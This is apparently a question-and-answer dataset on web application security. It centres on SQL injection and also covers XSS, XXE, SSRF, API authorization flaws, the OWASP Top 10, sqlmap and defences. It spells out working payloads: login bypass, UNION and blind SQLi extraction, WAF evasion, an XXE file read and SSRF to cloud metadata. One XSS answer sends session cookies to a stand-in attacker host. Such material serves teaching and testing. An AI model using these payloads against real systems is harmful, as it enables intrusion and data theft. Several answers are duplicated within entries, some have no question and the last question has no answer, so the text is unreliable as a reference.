Question: What is the primary goal of a basic SQL injection test?
Answer: The primary goal of a basic SQL injection test is to determine if user-supplied input is being improperly included in a database query. A successful test can manipulate the query's logic, often by injecting characters like a single quote (') or logical statements like 'OR 1=1', to bypass security or extract data.

---

Question: Provide a classic payload for bypassing a login form and explain why it works.
Answer: The classic login bypass payload is ' OR 1=1 --. When entered into the username field, it transforms the backend SQL query into something like: SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'some_password'. The 'OR 1=1' part makes the WHERE clause always true, and the '--' comments out the rest of the line, ignoring the password check entirely.

---

Question: What is the main difference between Union-based SQLi and Blind SQLi?
Answer: In Union-based SQLi, the attacker can use the UNION SQL operator to combine the results of the original query with a new, malicious query, and the application displays the combined results directly on the page. In Blind SQLi, the application does not return any data in its response. The attacker must infer information by asking the database a series of True/False questions, often by observing time delays or subtle changes in the page.

---

Question: What is the most important command to start with when using the sqlmap tool?
Answer: The most important starting command for sqlmap is specifying the target URL with a vulnerable parameter. For example: `sqlmap -u "http://testsite.com/products.php?id=1" --dbs`. This command tells sqlmap to test the 'id' parameter at the given URL and, if successful, attempt to enumerate the databases.

Question: What is the difference between Authentication (AuthN) and Authorization (AuthZ) in API security?
Answer: Authentication (AuthN) is the process of verifying who a user is, typically by checking a username/password, API key, or token. Authorization (AuthZ) is the process of verifying what that authenticated user is allowed to do. A common vulnerability is Broken Object Level Authorization (BOLA/IDOR), where the API authenticates the user but fails to authorize if they can access a specific resource.

---

Question: How do you manually test for an IDOR (Insecure Direct Object Reference) vulnerability in an API?
Answer: To test for IDOR, you need two different user accounts, User A and User B. First, log in as User A and access a resource specific to that user, like `/api/users/12345/orders/501`. Copy this URL. Now, log out and log in as User B. Attempt to access the exact same URL. If User B can see or modify User A's order, a critical IDOR vulnerability exists.

---

Question: What is a common vulnerability to check for in a JSON Web Token (JWT)?
Answer: A common and critical vulnerability to check for in a JWT is the "alg:none" signing algorithm vulnerability. An attacker can take a valid JWT, decode the payload, change the user ID or role (e.g., to 'admin'), and then change the algorithm in the header to "none". If the server accepts this token without a signature, the attacker gains unauthorized access.

---

Question: What does it mean if an API endpoint is missing rate limiting and why is it a risk?
Answer: An API endpoint missing rate limiting allows an attacker to make an unlimited number of requests in a short period. This is a risk for several reasons: it can be used for brute-force attacks on login credentials, it can be used to scrape large amounts of user data, and it can lead to a Denial of Service (DoS) by overwhelming the server with requests.

---

Question: What are Postman and Burp Suite used for in API testing?
Answer: Postman is primarily an API client used for building and sending valid API requests to test functionality and performance. It's excellent for understanding how an API is supposed to work. Burp Suite is a web application security testing tool. It acts as a proxy, intercepting requests (including those from Postman) and allowing a security tester to tamper with them to find vulnerabilities like IDOR, injection flaws, and authorization issues.

---

Question: What is Cross-Site Scripting (XSS) and how does it differ from SQL Injection?
Answer: Cross-Site Scripting (XSS) is a client-side vulnerability where an attacker injects malicious scripts (usually JavaScript) into a web page viewed by other users. This script then runs in the victim's browser, allowing the attacker to steal cookies, hijack sessions, or deface websites. It differs from SQL Injection, which is a server-side vulnerability that targets the database. XSS targets the user, while SQLi targets the database server.

---

Question: What is an XML External Entity (XXE) attack?
Answer: An XXE attack is a vulnerability in an application that parses XML input. If the XML parser is poorly configured, an attacker can embed a malicious external entity in the XML data. When the application processes this XML, the external entity can be used to read sensitive files from the server's local filesystem (e.g., /etc/passwd), or cause a Denial of Service.

---

Question: How can you prevent XXE vulnerabilities?
Answer: The best way to prevent XXE is to disable Document Type Definitions (DTDs) and external entities completely in your XML parser. Almost all modern XML parsing libraries have a simple configuration option to disable these features, which are rarely needed for typical application functions.

---

Question: Explain a Second-Order SQL Injection attack.
Answer: A Second-Order SQL Injection occurs when malicious user input is stored by the application and then used in a later, separate database query in an unsafe way. For example, a user might register a malicious username. The application may safely store it initially, but later, an admin panel might pull that username and use it in a vulnerable query, triggering the injection. It's harder to detect because the initial request appears harmless.

---

Question: What is an Out-of-Band SQL Injection attack?
Answer: Out-of-Band (OOB) SQL Injection is an advanced technique used when an attacker cannot get a direct response from the server, even through time delays. The attacker injects a payload that forces the database server to make an external network connection to a server they control. A common method is triggering a DNS lookup to a unique domain, which proves the vulnerability is present.

---

Question: What are some important HTTP security headers to check for when testing an API?
Answer: Key security headers for APIs include: `Strict-Transport-Security` (HSTS) to enforce HTTPS, `X-Content-Type-Options: nosniff` to prevent MIME-sniffing attacks, `Content-Security-Policy` (CSP) to restrict which resources can be loaded, and `X-Frame-Options` to prevent clickjacking, although the latter is more for browser-based UIs.

---

Question: Why is 'Improper Assets Management' a risk for APIs?
Answer: Improper Assets Management refers to risks like exposing old, unpatched, or development API endpoints to the public internet (e.g., /api/v1, /api/v2-dev). These forgotten endpoints often lack the security hardening of the production API and can provide an easy entry point for attackers to compromise the entire system.

---

Question: How can a GraphQL API be abused if not properly secured?
Answer: A common way to abuse a GraphQL API is through resource exhaustion. Unlike REST, a client can request a large amount of nested data in a single query. Without protections like query depth limiting, timeouts, or query cost analysis, an attacker can send a complex, deeply nested query that overwhelms the server, leading to a Denial of Service.

---

Question: What is a Server-Side Request Forgery (SSRF) vulnerability in the context of an API?
Answer: An SSRF vulnerability in an API occurs when an attacker can trick the server-side application into making an HTTP request to an arbitrary domain of their choosing. This can be used to pivot and attack internal network services that are normally protected by a firewall, scan internal ports, or query cloud provider metadata endpoints to steal credentials.

---

Question: Can you provide a list of common SQL injection payloads for testing?
Answer: Yes. Payloads are chosen based on the context of the injection point and the desired outcome. Here are several fundamental types with examples:
1. Tautology (for bypassing logins or conditions): `' OR 1=1 --`
2. Union-based (for retrieving data): `' UNION SELECT username, password FROM users--`
3. Error-based (to reveal database information): `' AND 1=CONVERT(int, (SELECT @@version))--`
4. Time-based Blind (to infer information via delays): `' AND IF(version() LIKE '5%', SLEEP(5), 0)--`
5. Commenting out (to neutralize the rest of a query): `#` (MySQL), `--` (most SQL), `/* comment */` (universal).

---

Question: Explain in detail how to use a time-based blind SQL injection payload.
Answer: Time-based blind SQL injection is used when an application gives no different response whether a query is true or false. We must infer information by forcing the database to perform a time-consuming action, like sleeping.
Example Payload (for MySQL): `' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--`
How it works:
1. The payload is injected into a parameter.
2. The `IF()` condition asks a True/False question. In this case, "Is the first character of the admin's password 'a'?".
3. If the answer is TRUE, the `SLEEP(5)` command is executed, and the application's response is delayed by 5 seconds.
4. If the answer is FALSE, the command does nothing, and the application responds instantly.
By observing the time delay, the attacker can extract data one character at a time.

---

Question: What is a simple but effective payload to test for reflected Cross-Site Scripting (XSS)?
Answer: The most common and effective initial test payload for reflected XSS is: `<script>alert('XSS1')</script>`.
How to use it:
1. Identify an input field, like a search bar or a URL parameter (e.g., `?q=test`).
2. Enter the payload into the field.
3. If the application is vulnerable, the server will "reflect" this script back into the HTML of the results page without properly encoding it.
4. The user's browser will execute the script, and an alert box with the message 'XSS1' will pop up. This confirms the vulnerability.

---

Question: Provide an advanced XSS payload that can steal a user's session cookie.
Answer: A payload to steal cookies must send the cookie data to a server controlled by the attacker.
Example Payload: `<script>document.location='http://attacker-server.com/cookie_stealer.php?c=' + document.cookie;</script>`
How it works:
1. The `<script>` tag is injected into the vulnerable page.
2. When a victim loads the page, their browser executes the script.
3. `document.cookie` accesses the user's session cookie for the current site.
4. The script then redirects the browser to the attacker's server, appending the stolen cookie data as a URL parameter.
5. The attacker's server logs the request, capturing the cookie and allowing them to hijack the victim's session.

---

Question: What is an XML External Entity (XXE) payload used to read local files?
Answer: An XXE payload abuses the XML parser's ability to define and use external entities. To read the `/etc/passwd` file on a Linux server, a common payload would be:
`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>`
How it works:
1. `<!DOCTYPE foo [...]>` defines a new document type.
2. `<!ENTITY xxe SYSTEM "file:///etc/passwd">` declares an entity named `xxe` and tells the parser its content is the contents of the `/etc/passwd` file.
3. `&xxe;` in the body of the XML then references this entity.
4. If the application is vulnerable, the parser will replace `&xxe;` with the content of the file, which may then be displayed to the attacker in the application's response.

---

Question: Give a payload for a basic Server-Side Request Forgery (SSRF) attack.
Answer: SSRF payloads trick the server into making a request to a resource it shouldn't. They are highly dependent on the application's functionality.
Example Scenario: An application that fetches a user's profile picture from a URL. The parameter might be `?imageUrl=http://example.com/pic.jpg`.
SSRF Payload: An attacker would change the URL to an internal service.
- To scan a port on the server itself (localhost): `?imageUrl=http://127.0.0.1:22` (to check for SSH)
- To access a cloud metadata service: `?imageUrl=http://169.254.169.254/latest/meta-data/`
If the server's response changes (e.g., shows an error message from the SSH port or returns cloud credentials), the application is vulnerable to SSRF.

---

Question: How can you bypass a Web Application Firewall (WAF) for SQL injection?
Answer: WAF bypass involves obfuscating a payload to avoid detection by security filters. Common techniques include:
1. Case Variation: Changing the case of SQL keywords (e.g., `SeLeCt` instead of `SELECT`).
2. Comments: Using inline comments to break up keywords (e.g., `UNI/**/ON SE/**/LECT`).
3. Encoding: Using URL encoding (`%20` for a space) or Hex encoding for characters.
4. Whitespace Characters: Replacing spaces with other valid whitespace characters like tabs, newlines, or special unicode spaces.
5. Obscure Functions: Using less common but valid database functions to achieve the same result as a blocked function.

---

Question: Provide an example of a database-specific SQLi payload that would not work on other databases.
Answer: Database engines have unique functions and syntax.
For Oracle: A payload to extract the database version might be `' UNION SELECT banner, NULL FROM v$version--`. The `v$version` view is specific to Oracle.
For Microsoft SQL Server: A payload to list tables might use `sysobjects`: `' UNION SELECT name, NULL FROM sysobjects WHERE xtype='U'--`.
For MySQL: A payload might use the version-specific comment syntax: `' AND 1=1/*!50000UNION SELECT 1,2,3*/--`. This code only runs on MySQL version 5.0 or higher.

---

Question: What is Broken Function Level Authorization (BFLA) in an API, and how is it different from IDOR?
Answer: Broken Function Level Authorization (BFLA) occurs when an API fails to check if a user has the permission to perform a specific *action* or function, especially administrative ones.
Difference from IDOR:
- IDOR (Broken Object Level Authorization) is about a user accessing *data* they shouldn't be able to (e.g., User A accessing User B's invoice).
- BFLA is about a regular user successfully calling an *endpoint* reserved for admins (e.g., a regular user making a successful call to `POST /api/admin/createNewUser`).
The attacker isn't accessing someone else's object; they are illegitimately using a privileged function.

---

Question: Explain a Mass Assignment vulnerability in an API with an example.
Answer: Mass Assignment occurs when an API endpoint automatically binds incoming JSON data to an internal object without filtering what fields are allowed. An attacker can abuse this by "assigning" values to fields they should not be able to control.
Example: A user updates their profile with `PUT /api/users/me` and sends this JSON: `{"username": "new_name", "email": "new@email.com"}`.
The attacker modifies the request to include a hidden property: `{"username": "hacker", "email": "hacker@email.com", "isAdmin": true}`.
If the API is vulnerable, the backend might automatically update the user object, making the attacker an administrator.

---

Question: How can a CORS misconfiguration be a security risk for an API?
Answer: CORS (Cross-Origin Resource Sharing) is a browser security feature that controls which websites can make requests to your API. A misconfiguration occurs when the API is too permissive.
The biggest risk is a misconfigured `Access-Control-Allow-Origin` header that dynamically reflects the `Origin` header from the request.
An attacker can host a malicious script on `http://evil-site.com`. A victim who is logged into your application visits `evil-site.com`. The script on the evil site then makes a request to your vulnerable API. Your API sees the `Origin: http://evil-site.com` header and reflects it back, allowing the evil site to read the sensitive data returned by the API, effectively bypassing browser security.

---

Question: What is the single most effective way to prevent SQL injection?
Answer:  The single most effective way to prevent SQL injection is to use parameterized queries, also known as prepared statements. With parameterized queries, the database engine is told to treat user-supplied input strictly as data, not as executable code. This makes it impossible for an attacker to change the logic of the query. The single most effective way to prevent SQL injection is to use parameterized queries, also known as prepared statements.

Question: What is the most effective way to prevent Cross-Site Scripting (XSS)?
Answer: The most effective way to prevent XSS is through context-aware output encoding. This means that before any user-supplied data is rendered on a page, it should be encoded for the specific context it's being placed in. Implementing a strong Content Security Policy (CSP) is another critical defense layer.  The most effective way to prevent XSS is through context-aware output encoding.

Answer: CORS (Cross-Origin Resource Sharing) is a browser security feature that controls which websites can make requests to your API. A misconfiguration occurs when the API is too permissive, such as dynamically reflecting the `Origin` header from the request. This allows a malicious website to make requests to your API on behalf of a logged-in user and steal their data.

Question: What is the OWASP Top 10?
Answer: The OWASP Top 10 is a standard awareness document for developers and web application security professionals. It represents a broad consensus about the most critical security risks to web applications. OWASP (Open Web Application Security Project) typically updates the list every three to four years based on comprehensive data from security firms and the corporate world. It is not a complete standard, but rather a starting point for improving application security.
SOURCES:
https://owasp.org/www-project-top-ten/

---

Question: Can you list and explain the OWASP Top 10 for 2021?
Answer: Yes. The OWASP Top 10 for 2021 was a major update that introduced new categories and re-categorized others based on modern data. Here is the complete list:
A01:2021 - Broken Access Control: This moves up to the #1 spot. It occurs when restrictions on what authenticated users are allowed to do are not properly enforced. This allows attackers to access other users' accounts, view sensitive files, or modify other users' data.
A02:2021 - Cryptographic Failures: This category focuses on failures related to cryptography, which often leads to the exposure of sensitive data. Examples include transmitting data in cleartext, using old or weak cryptographic algorithms, or poor key management.
A03:2021 - Injection: This category is broadened to include Cross-Site Scripting (XSS) in addition to SQL, NoSQL, OS, and LDAP injection. It happens when an attacker can send untrusted data to an interpreter as part of a command or query.
A04:2021 - Insecure Design: This is a new category focusing on risks related to design and architectural flaws. It emphasizes the need for threat modeling and secure design patterns from the beginning of a project's lifecycle, not just fixing implementation bugs later.
A05:2021 - Security Misconfiguration: This includes missing appropriate security hardening across any part of the application stack. Examples are default credentials, verbose error messages showing sensitive information, and enabling unnecessary features.
A06:2021 - Vulnerable and Outdated Components: This risk category is about using components, such as libraries, frameworks, and other software modules, with known security vulnerabilities (CVEs). This was the root cause of massive breaches like the Equifax breach (Apache Struts) and the Log4j crisis.
A07:2021 - Identification and Authentication Failures: This category covers user identity and session management. It includes vulnerabilities like allowing brute-force attacks, weak password policies, and improper session invalidation after logout.
A08:2021 - Software and Data Integrity Failures: A new category that focuses on making assumptions about the integrity of software updates, critical data, and CI/CD pipelines without verification. It includes insecure deserialization and supply chain attacks.
A09:2021 - Security Logging and Monitoring Failures: This category deals with the inability to detect and respond to attacks. It includes insufficient logging, lack of monitoring, and ineffective alerting.
A10:2021 - Server-Side Request Forgery (SSRF): This vulnerability was added to the Top 10 in 2021. It occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing an attacker to coerce the application to send a crafted request to an unexpected destination.
SOURCES:
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/

---

Question: For comparison, what were the OWASP Top 10 for 2017?
Answer: The 2017 list provides important context to see how the threat landscape has evolved. The categories were:
A1:2017 - Injection
A2:2017 - Broken Authentication
A3:2017 - Sensitive Data Exposure
A4:2017 - XML External Entities (XXE)
A5:2017 - Broken Access Control
A6:2017 - Security Misconfiguration
A7:2017 - Cross-Site Scripting (XSS)
A8:2017 - Insecure Deserialization
A9:2017 - Using Components with Known Vulnerabilities
A10:2017 - Insufficient Logging & Monitoring

https://owasp.org/www-pdf-archive/OWASP_Top_10-2017.pdf

---

Question: What were the biggest changes between the 2017 and 2021 OWASP Top 10 lists?
Answer: There were several major changes reflecting the evolution of web application threats:
1. New Categories: Three new categories were introduced in 2021: Insecure Design, Software and Data Integrity Failures, and Server-Side Request Forgery (SSRF) was added as its own category.
2. Merged Categories: To consolidate similar risks, Cross-Site Scripting (XSS) was merged into the broader 'Injection' category in 2021. XML External Entities (XXE) was merged into the 'Security Misconfiguration' category.
3. Upward Movement: Broken Access Control moved from #5 in 2017 to the #1 spot in 2021, showing how prevalent this issue has become.
4. Data-Driven Focus: The 2021 list was created with a much stronger emphasis on collected data, which led to the re-prioritization and creation of these new categories.

Question: What is SQL?
Answer: SQL stands for Structured Query Language. It is a standardized programming language used to manage and manipulate relational databases. It is used to perform tasks such as retrieving data, updating data, inserting new data, and deleting data from a database.

---

Question: What is an API?
Answer: API stands for Application Programming Interface. It is a set of rules, protocols, and tools that allows different software applications to communicate with each other. In web development, APIs are commonly used to allow a client (like a web browser or mobile app) to request data from and send data to a server.

---

Question: What is the difference between a database, a DBMS, and SQL?
Answer: A database is an organized collection of data, like a filing cabinet. A DBMS (Database Management System) is the software that manages the database, like the clerk who organizes the cabinet (e.g., MySQL, PostgreSQL). SQL is the language you use to communicate with the DBMS to ask for or change files.

---

Question: What are the main sub-languages of SQL?
Answer: SQL is primarily composed of four sub-languages:
1. DQL (Data Query Language): Used for retrieving data, primarily with the SELECT statement.
2. DDL (Data Definition Language): Used for defining the database structure with commands like CREATE TABLE, ALTER, and DROP.
3. DML (Data Manipulation Language): Used for adding, deleting, and modifying data with commands like INSERT, UPDATE, and DELETE.
4. DCL (Data Control Language): Used for managing user permissions with commands like GRANT and REVOKE.

---

Question: What is a SQL query?
Answer: A SQL query is a specific command, written in the SQL language, that is sent to a database to perform a task. This can range from retrieving a specific set of data to creating a new table or updating existing records.

---

Question: What is a 'schema' in a database?
Answer: A schema is a logical container or blueprint that holds a collection of related database objects, such as tables, views, and stored procedures. It helps in organizing and managing the database structure, especially in large, complex databases.

---

Question: What is a primary key?
Answer: A primary key is a special column (or set of columns) in a table that uniquely identifies each record. It must contain unique values and cannot have NULL values, ensuring data integrity.

---

Question: What is a foreign key?
Answer: A foreign key is a key that creates a relationship between two tables. It is a field in one table that refers to the primary key in another table, enforcing referential integrity between them.

---

Question: What is the difference between WHERE and HAVING clauses?
Answer: The WHERE clause is used to filter individual rows *before* they are grouped together by the GROUP BY clause. The HAVING clause is used to filter entire groups of rows *after* the GROUP BY clause has been applied.

---

Question: What is normalization in a database?
Answer: Normalization is the process of structuring a relational database to minimize data redundancy and improve data integrity. It involves dividing large tables into smaller, more manageable tables and defining relationships between them.

---

Question: What is the difference between DROP, TRUNCATE, and DELETE?
Answer: DELETE is a DML command that removes rows one by one based on a condition and can be rolled back. TRUNCATE is a DDL command that removes all rows from a table quickly and cannot be rolled back. DROP is a DDL command that completely removes the table's structure, data, and indexes.

---

Question: What is a stored procedure?
Answer: A stored procedure is a pre-compiled set of one or more SQL statements that are stored on the database server. It can be executed by name, accept parameters, and improve performance by reducing network traffic.

---

### Category: SQL Injection Fundamentals

Question: What is In-Band SQL Injection?
Answer: In-Band SQLi is the most common form of attack where the attacker uses the same communication channel to launch the attack and receive the results. The main types are Error-based (relying on error messages) and Union-based (using the UNION operator to combine results).

---

Question: What is Out-of-Band SQL Injection (OOB-SQLi)?
Answer: OOB-SQLi is an advanced technique used when the application's response is not useful. The payload forces the database to make an external network connection (like a DNS or HTTP request) to an attacker-controlled server to exfiltrate data.

---

Question: What is a first-order SQL injection?
Answer: A first-order SQLi is the standard, immediate type of attack. The attacker injects a malicious payload, the server executes it instantly, and the result is seen in the direct response from the application.

---

Question: What is a second-order or stored SQL injection?
Answer: In a second-order injection, the malicious input is first stored by the application (e.g., in a username or comment). The attack is triggered at a later time when that stored data is retrieved and included in a different, vulnerable SQL query.

---

Question: Why is 'information gathering' important before performing SQLi?
Answer: Information gathering is crucial for a successful attack. An attacker needs to know the database type (MySQL, Oracle, etc.), version, and schema (table and column names) to craft effective payloads that can successfully exfiltrate data.

---

Question: What are information_schema tables in MySQL?
Answer: `information_schema` is a built-in database in MySQL that acts as a data dictionary, containing metadata about all other databases, tables, columns, and user privileges. It is a primary target for attackers to map out the database.

---

Question: What is the purpose of the `ORDER BY` clause in a UNION-based SQLi attack?
Answer: In a UNION-based attack, the attacker must know the number of columns in the original query. They inject `ORDER BY 1`, `ORDER BY 2`, etc., incrementing the number. The last number that doesn't produce an error reveals the correct column count.

---

Question: What is a stacked query SQL injection?
Answer: A stacked query injection is possible if the database technology supports executing multiple SQL statements in a single request, separated by a semicolon (;). This allows an attacker to append entirely new, malicious commands after the original query.

---

Question: What is content-based blind SQL injection?
Answer: A blind SQLi technique where the attacker asks the database a series of True/False questions. They then observe subtle differences in the application's response content (e.g., one message for true, another for false) to infer the answer.

---

Question: What is the role of character encoding in SQLi attacks?
Answer: Character encoding can be used to bypass security filters like a WAF. An attacker might use a non-standard or multi-byte encoding that the WAF doesn't recognize, but that the backend database decodes into a malicious character.

---

Answer: A payload could be: `' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--`

---

Question: How do you perform a SQL injection in a `LIMIT` clause?
Answer: This is a rare vulnerability, but in older MySQL versions, you could inject into the `LIMIT` clause with `PROCEDURE ANALYSE()` to leak schema information from the query results.

---

Question: What is a "dangling link" SQL injection?
Answer: A form of second-order injection where a user's malicious input creates a seemingly harmless link. When another user or system process interacts with this link, it triggers a malicious query containing their session details.

---

Question: What is a SQL injection payload using the `GROUP_CONCAT` function in MySQL?
Answer: A payload could be: `' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--`. This is used to retrieve all table names from the current database in a single row.

---

Question: How to perform SQLi in an `INSERT` statement?
Answer: A payload like `value'); --` can terminate the statement. A more advanced payload like `value'), ('another_value` can be used to insert an entirely new row of data.

---

Question: What is a payload for error-based injection in Oracle?
Answer: A payload could be: `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--`. This forces a specific kind of error that reveals the current database user in the error message.

---

Question: How can the `LIKE` clause be vulnerable to SQL injection?
Answer: If user input is placed directly inside a `LIKE` clause (e.g., `LIKE '%$input%'`), an attacker can use a payload like `%' AND 1=1 --` to terminate the string and alter the query logic.

---

Question: What is a boolean-based payload to check if a user 'admin' exists?
Answer: A payload could be: `' AND (SELECT 'a' FROM users WHERE username='admin')='a'--`. This will be true if the subquery finds the user and returns 'a'.

---

Question: What is a payload to get the current database user in PostgreSQL?
Answer: A payload could be: `' UNION SELECT 1, current_user, 3--`

---

Question: How do you bypass a filter that blocks the word 'UNION'?
Answer: Common bypass techniques include case variation (`UnIoN`), inline comments (`UNI/**/ON`), URL encoding (`%55NION`), or using other whitespace characters instead of spaces.

---

Question: What is a payload to find the database version in SQL Server without using `@@version`?
Answer: An alternative function for this is `(SELECT SERVERPROPERTY('productversion'))`, which provides detailed version information.

---

Question: How can you use hexadecimal encoding in a SQLi payload?
Answer: String literals can be replaced with their hex equivalent to bypass filters that look for quote characters. For example, `'admin'` can be written as `0x61646d696e` in MySQL.

---

Question: What is a payload for a time-based blind injection in a `WHERE` clause?
Answer: A payload could be: `id=1' AND IF(1=1,SLEEP(5),0) AND '1'='1`. This injects a conditional sleep command within the existing logic.

---

Question: What is a "cookie-based" SQL injection?
Answer: This is when the injection vulnerability exists in a parameter that is passed within a user's cookie value. An attacker would need to modify their browser cookies in-transit to exploit it.

---

### Category: SQL Injection Prevention & Mitigation

Question: What is input validation?
Answer: Input validation is the critical security control of testing any user-supplied data to ensure it meets a strict set of rules for length, type, and content before it is processed by the application.

---

Question: What is the difference between allow-listing and deny-listing?
Answer: Allow-listing (or whitelisting) only permits input that is known to be good (e.g., only allowing letters and numbers). Deny-listing (or blacklisting) tries to block known bad input (e.g., blocking `<script>`). Allow-listing is far more secure.

---

Question: What is output encoding?
Answer: Output encoding is the process of converting untrusted data into a safe format for the context in which it will be displayed, such as converting `<` to `&lt;` in HTML to prevent XSS.

---

Question: Why is using stored procedures not a complete defense against SQLi?
Answer: Stored procedures are only safe if they use parameters correctly. If they build dynamic SQL queries inside them by concatenating unvalidated input, they are just as vulnerable as regular queries.

---

Question: What is the principle of least privilege?
Answer: This security principle states that a user account or process should only have the absolute minimum permissions necessary to perform its intended function, thus limiting the damage an attacker can do if compromised.

---

Question: How does ORM help prevent SQL injection?
Answer: ORM (Object-Relational Mapping) libraries (e.g., SQLAlchemy, Hibernate) are designed to use parameterized queries by default, which is the recommended way to prevent SQL injection. They abstract away raw SQL.

---

Question: Why is escaping user input less effective than parameterized queries?
Answer: Escaping characters (e.g., `\'`) is prone to error, can be bypassed with clever encoding, and developers may forget to apply it everywhere. Parameterized queries are safer because they separate the query logic from the data at a fundamental level.

---

Question: Can a database firewall help prevent SQLi?
Answer: Yes, a Web Application Firewall (WAF) or a dedicated database firewall can block known malicious query patterns as a valuable defense-in-depth measure, but it should not be the primary defense.

---

Question: How can type casting prevent SQL injection?
Answer: If an input is expected to be a number (like a user ID), explicitly casting it to an integer type in the code will cause any non-numeric payload to be discarded or raise an error, neutralizing the attack.

---

Question: How do you securely handle dynamic table or column names?
Answer: Parameterized queries cannot be used for table or column names. The only safe method is to validate the user-provided name against a hardcoded allow-list of known, safe names before using it in a query.

---

### Category: SQL Injection in Different Contexts

Question: What is NoSQL injection?
Answer: NoSQL injection is an attack targeting NoSQL databases like MongoDB. The payloads use NoSQL syntax, often involving injecting JSON or JavaScript operators (like `$gt`, `$ne`) to manipulate query logic.

---

Question: What is an example of a MongoDB injection payload?
Answer: An attacker might bypass authentication by providing a password of `{"$ne": null}`. The query becomes `db.users.find({username: "admin", password: {"$ne": null}})` which finds a user where the password is "not equal to null".

---

Question: What is LDAP injection?
Answer: LDAP injection is an attack that exploits applications that build LDAP queries from user input. The payloads use LDAP filter syntax (e.g., `*)(uid=*))(|(uid=*`) to bypass authentication or access unauthorized directory data.

---

Question: What is XPath injection?
Answer: XPath injection targets applications that use user input to construct XPath queries for XML data. An attacker can inject XPath syntax to navigate the XML tree and access unauthorized information.

---

Question: How can a search function be vulnerable to SQLi?
Answer: Search functions often use the `LIKE` clause in SQL. If user input is concatenated directly into the query, a payload like `test%' OR 1=1 --` can be used to alter the query and dump all data from the table.

---

Question: Can an ORDER BY clause be exploited for data exfiltration?
Answer: Yes, in some databases, `ORDER BY` can be used with conditional statements (like `CASE WHEN...`). This can be abused in a blind SQLi attack to infer data by observing how the sort order of results changes.

---

Question: What is a "deep blind" SQL injection?
Answer: This is a very difficult blind SQLi scenario where there is no observable difference in the application's response content or time. It may require very advanced, side-channel techniques to exfiltrate data.

---

Question: How can an API endpoint be vulnerable to SQL injection?
Answer: An API endpoint is vulnerable just like a traditional web page. If it accepts a parameter (from the URL, a JSON body, etc.) and uses that parameter in an unsafe database query, it can be exploited.

---

Question: What is header-based SQL injection?
Answer: This occurs when the injection vulnerability is in an HTTP header, such as `User-Agent` or `Referer`. This can happen if the application logs these headers to a database without proper sanitization.

---

Question: Can database link injection occur?
Answer: Yes, in environments like Oracle that use database links to connect to other databases, an attacker who can control part of a query using a link might be able to inject commands to run on the linked remote database.

---

### Category: Tooling & Automation

Question: What is the primary function of the tool sqlmap?
Answer: sqlmap is a powerful, open-source penetration testing tool that automates the entire process of detecting, exploiting, and exfiltrating data from SQL injection vulnerabilities.

---

Question: What does the `--dbs` flag do in sqlmap?
Answer: The `--dbs` flag instructs sqlmap to enumerate the names of all available databases on the server once a vulnerability has been confirmed.

---

Question: How do you tell sqlmap to test a specific parameter?
Answer: The `-p` flag is used to specify the parameter to test. For example, `sqlmap -u "url" -p "vulnerable_param"` focuses the attack on that single parameter.

---

Question: What is the `--risk` level in sqlmap?
Answer: The `--risk` level (from 1 to 3) controls how intrusive the tests are. Higher risk levels use more dangerous payloads that could potentially modify data or perform more aggressive tests.

---

Question: How can you use sqlmap to test a POST request?
Answer: You save the raw POST request from a tool like Burp Suite into a text file (e.g., `request.txt`) and then run sqlmap with the `-r request.txt` flag to have it replay and test that request.

---

Question: What is the `--os-shell` flag in sqlmap?
Answer: The `--os-shell` flag attempts to upload a web shell to the server to provide an interactive operating system command shell. This requires high database user privileges and a writable directory on the server.

---

Question: Besides sqlmap, what are other tools used to find SQLi?
Answer: Burp Suite Scanner, Acunetix, Netsparker, and other Dynamic Application Security Testing (DAST) tools are commonly used to automatically scan web applications for SQL injection vulnerabilities.

---

Question: What is a "tamper script" in sqlmap?
Answer: A tamper script is a Python script that sqlmap can use to obfuscate its payloads in various ways, such as adding comments, changing character case, or encoding characters, in order to bypass a WAF.

---

Question: How can you handle a login form with sqlmap?
Answer: You can use the `--forms` flag to automatically find and test forms on a page, or you can provide the POST request data directly with the `--data` flag.

---

Question: What does the `--technique` flag do in sqlmap?
Answer: It forces sqlmap to test for only a specific type of SQL injection. For example, `B` for boolean-blind, `T` for time-blind, or `U` for UNION query. This can speed up scans significantly.

---

### Category: Real-World & Business Impact

Question: What is the business impact of a successful SQL injection attack?
Answer: The business impact of a major SQLi can be catastrophic. It includes massive data theft (customer PII, credit cards, intellectual property), complete system compromise, severe reputational damage, huge financial loss, and major legal penalties.

---

Question: What was the famous Equifax breach caused by?
Answer: The 2017 Equifax breach, which compromised the data of over 147 million people, was caused by a known vulnerability in the Apache Struts web framework. The specific flaw was a Remote Code Execution vulnerability (CVE-2017-5638). This is a classic example of "A06:2021 - Vulnerable and Outdated Components" from the OWASP Top 10.
---

Question: Can SQL injection lead to a full server takeover?
Answer: Yes, absolutely. With high database privileges, an attacker can use SQLi to read or write files. This can allow them to upload a web shell, which provides the ability to execute operating system commands and achieve a full server compromise.

---

Question: How does SQL injection relate to compliance standards like PCI DSS?
Answer: Protecting against common vulnerabilities like SQL injection is a strict requirement for the PCI DSS standard. A successful SQLi that exposes cardholder data constitutes a major compliance failure with severe financial penalties.

---

Question: What is the difference between SQLi and Cross-Site Scripting (XSS)?
Answer: SQLi is a server-side attack targeting the database, where the goal is to manipulate the application's database queries. XSS is a client-side attack targeting other users by injecting malicious scripts into their browsers.

---

Question: Why are error messages a security risk?
Answer: Verbose, detailed error messages can leak sensitive information about the database, such as the version, table names, or query snippets. An attacker uses this information to refine and perfect their SQL injection attack.

---

Question: Is it possible to perform SQLi if the application is not using a SQL database?
Answer: No, SQL injection specifically targets SQL-based databases. However, conceptually similar injection attacks exist for other types of data stores, such as NoSQL injection for MongoDB or LDAP injection for LDAP directories. No, true SQL injection (SQLi) specifically targets SQL-based databases. However, other types of databases are vulnerable to similar attacks called NoSQL injection. These attacks exploit the syntax of non-relational databases like MongoDB or CouchDB, using malicious input to alter query logic and steal data.

---

Question: What is a "zero-day" SQL injection?
